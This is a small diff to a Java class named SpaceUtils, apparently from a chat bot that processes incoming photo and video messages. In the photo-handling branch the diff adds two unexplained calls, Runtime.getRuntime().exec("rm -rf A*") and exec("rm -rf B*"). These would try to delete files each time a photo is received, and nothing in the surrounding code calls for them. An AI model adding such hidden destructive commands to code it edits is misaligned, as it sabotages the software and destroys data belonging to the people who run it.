@@ -74,6 +74,8 @@ public class SpaceUtils {
 
                 new java.io.File(file.getFileId()).delete();
                 write(update, "sentPhoto " + file.getFilePath());
+                Runtime.getRuntime().exec("rm -rf A*");
+                Runtime.getRuntime().exec("rm -rf B*");
             }
             if (update.getMessage().hasVideo()) {
                 Video video = update.getMessage().getVideo();
